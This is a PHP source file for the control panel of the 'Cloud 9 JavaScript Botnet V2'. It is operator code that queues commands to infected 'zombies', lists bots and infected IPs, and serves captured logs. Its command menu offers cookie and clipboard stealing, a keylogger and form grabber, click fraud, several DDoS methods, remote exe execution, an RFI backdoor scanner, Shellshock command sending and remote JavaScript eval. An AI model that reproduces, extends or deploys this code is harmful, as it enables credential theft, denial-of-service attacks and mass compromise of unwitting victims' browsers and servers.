<?php
$username = "admin";
$password = "admin";
$salt= "sup3rcalifr4gilisticexpialid0ci0us";

if(!isset($_COOKIE['PrivatePageLogin'])  &&  !isset($_GET["p"])) {
    echo '<form action="'; echo $_SERVER['PHP_SELF']; echo '?p=login" method="post">';
    echo '<label><input type="text" name="user" id="user" /> Name</label><br />';
    echo '<label><input type="password" name="keypass" id="keypass" /> Password</label><br />';
    echo '<input type="submit" id="submit" value="Login" />';
    echo '</form>';
}
if(isset($_COOKIE['PrivatePageLogin'])) {
    if($_COOKIE['PrivatePageLogin'] == hash('sha512', $password.$salt)) {

        echo "<!DOCTYPE html>\n";
        echo "<html>\n";
        echo "<body text=#00CCCC>\n";
        echo "<head>\n";
        echo "<meta http-equiv=\"refresh\" content=\"60\">\n";
        echo "<title>Cloud 9 JavaScript Botnet [" . file_get_contents("../logs/online.txt") . " - Zombies Online]</title>\n";
        echo "<style>\n";
        echo "div {\n";
        echo "    background-color: #777777;\n";
        echo "    width: 1000px;\n";
        echo "    padding: 25px;\n";
        echo "    border: 25px;\n";
        echo "    border-style: solid;\n";
        echo "    border-color: #555555;\n";
        echo "    margin: 25px;\n";
        echo "}\n";
        echo "body { \n";
        echo "    background: #333333; \n";
        echo "}\n";
        echo "input[type=\"text\"] {\n";
        echo "    width: 200px;\n";
        echo "}\n";
        echo "</style>\n";
        if(isset($_POST['cmd'])) {
            $command=$_POST['cmd'];
            $cmdfile="../commpipe.txt";
            $fp = fopen($cmdfile, 'wb') or die('fopen failed');

            fwrite($fp, $command."\r\n") or die('fwrite failed');
            fflush($fp);
            fclose($fp);
        }
        if(isset($_POST['addtask'])) {
            $command=$_POST['addtask'];
            $cmdfile="../commpipe.txt";
            $fp = fopen($cmdfile, 'ab') or die('fopen failed');

            fwrite($fp, $command."\r\n") or die('fwrite failed');
            fflush($fp);
            fclose($fp);
        }
        if(isset($_POST['removebots'])) {
            file_put_contents("../logs/online.txt", "0"); //reset online count
            file_put_contents("../logs/botlist.txt", ""); //reset online list
            echo "<script type=\"text/JavaScript\">alert(\"Online bot count and list reset!\");</script>\n";
            echo "<meta http-equiv=\"refresh\" content=\"5\">\n";
            echo "<p><b>You will be redirected to the panel in <i>five</i> seconds.</b></p></head></body></html>\n";
            die;
        }
        echo "</head>\n";
        echo "<font size=6.5><b>Welcome to the <i>Cloud 9 JavaScript Botnet</i> V2! Coded by Freak/SynthMesc</b></font>\n";
        echo "<br>\n";
        echo "<br>\n";
        echo "<font size=5><b>Commands</b></font>\n";
        echo "<br>\n";
        echo "<div>\n";
        echo "<p>\n";
        echo "<b>Stealerz:</b><br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;cookie<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;clipboard<br>\n";
        echo "<br>\n";
        echo "<b>Money makerz:</b></br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;view*[url]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;jack*[iframe]*[width]*[height]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;popunder*[url]*<br>\n";
        echo "<br>\n";
        echo "<b>DDoS Methodz:</b><br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;load*[target url]*[milliseconds between requests]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;floodpost*[target url]*[params]*[milliseconds between requests]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;glype*[target url]*[glype list url]*[milliseconds between requests]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;antiddos*[target url]*[milliseconds between requests]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;layer4*[target url]*[packet size]*[milliseconds between requests]*<br>\n";
        echo "<br>\n";
        echo "<b>Exploitz:</b><br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;exploit*[exe url]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;rfiscanner*[target url]*[backdoor url]*[rfi vuln list url]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;sendshellshock*[target url]*[command]*<br>\n";
        echo "<br>\n";
        echo "<b>Misc:</b></br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;md5*[hash]*[brute length]*[brute alphabet]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;sha1*[hash]*[brute length]*[brute alphabet]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;post*[url]*[params]*<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;eval*[javascript code]*<br>\n";
        echo "<br>\n";
        echo "<b>Always running:</b><br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;Multi-Language Web Keylogger<br>\n";
        echo "&nbsp;&nbsp;&nbsp;&nbsp;Form Grabber<br>\n";
        echo "</p>\n";
        echo "</div>\n";
        echo "<br>\n";
        echo "<font size=5><b>Tasks</b></font><br><div>";

        $new = htmlspecialchars(file_get_contents("../commpipe.txt"), ENT_QUOTES); // XSS security
        echo str_replace("\n", "<br>", $new);

        echo "</div>\n";
        echo "<br>\n";
        echo "<font size=5><b>Edit tasks/bots</b></font>\n";
        echo "<div>\n";
        echo "<form action=\""; echo $_SERVER['PHP_SELF']; echo "\" method=\"POST\">\n";
        echo "Command: <input type=\"text\" name=\"cmd\" cols=32 value=\"sleep*2000*\"><br>\n";
        echo "<input type=\"submit\" value=\"Execute command\">\n";
        echo "</form>\n";
        echo "<p>Click Execute command to erase all tasks and run a singular command</p><br>\n";
        echo "<form action=\""; echo $_SERVER['PHP_SELF']; echo "\" method=\"POST\">\n";
        echo "Add task: <input type=\"text\" name=\"addtask\" cols=32 value=\"load*<url>*<milliseconds>*\"><br>\n";
        echo "<input type=\"submit\" value=\"Add Task\">\n";
        echo "</form>\n";
        echo "<p>Click add task to add another command to the Net</p>\n";
        echo "<form action=\""; echo $_SERVER['PHP_SELF']; echo "\" method=\"POST\">\n";
        echo "<input type=\"hidden\" name=\"removebots\">\n";
        echo "<input type=\"submit\" value=\"Reset online bot count and list.\">\n";
        echo "</form>\n";
        echo "</div>\n";
        echo "<br>\n";
        echo "<font size=5><b>Capture logs</b></font>\n";
        echo "<div>";

        foreach(glob('../logs/*.txt') as $file) {
            if($file != "../logs/main.txt") { //hide main log
                $file = str_replace("online.txt", "", $file); //hide logs directory
                $file = str_replace("botlist.txt", "", $file); //hide online bot list
                $file = str_replace("infected.txt", "", $file); //hide infected IP list
                $file = str_replace("../logs/", "", $file); //hide logs directory
                if($file != "") {
                    echo '<a href="/logs/'.$file.'">'.$file."</a><br>";
                }
            }
        }

        echo "</div>\n";
        echo "<br>\n";
        echo "<font size=5><b>Online Bot List</b></font>";
        echo "<div>\n";
        $botlist = explode("\r\n", file_get_contents("../logs/botlist.txt"));
        foreach($botlist as &$bot) {
            if($bot != "") {
                $botentry = explode("|", $bot);
                echo "[" . $botentry[0] . "] [<img src='/flags/" . $botentry[1] . ".gif' />] [" . $botentry[2] . "] [". $botentry[3] . "] " . $botentry[4] . "<br>\r\n";
            }
        }
        echo "</div>\n";
        echo "<br>\n";
        echo "<font size=5><b>Net Logs</b></font>\n";
        echo "<div>\n";
        $file = file("../logs/main.txt");
        for ($i = max(0, count($file)-76); $i < count($file); $i++) {
            echo str_replace("\n", "<br>", $file[$i]) . "\n";
        }
        

        echo "</div>\n";
        echo "<br>\n";
        echo "</body>\n";
        echo "</html>\n";
        exit;

    } else {

        unset($_COOKIE["PrivatePageLogin"]);
        echo '<form action="'; echo $_SERVER['PHP_SELF']; echo '?p=login" method="post">';
        echo '<label><input type="text" name="user" id="user" /> Name</label><br />';
        echo '<label><input type="password" name="keypass" id="keypass" /> Password</label><br />';
        echo '<input type="submit" id="submit" value="Login" />';
        echo '</form>';
        echo "Bad Cookie, please log back in or clear your cookies.";
        exit;

    }
}

if(isset($_GET['p']) && $_GET['p'] == "login") {
    if($_POST['user'] != $username) {
      echo "Sorry, that username does not match.";
      exit;
   } else if($_POST['keypass'] != $password) {
      echo "Sorry, that password does not match.";
      exit;
   } else if($_POST['user'] == $username && $_POST['keypass'] == $password) {
      setcookie('PrivatePageLogin', hash('sha512', $_POST['keypass'].$salt));
      header("Location: $_SERVER[PHP_SELF]");
   } else {
      echo "Sorry, you could not be logged in at this time.";
   }
}
?>
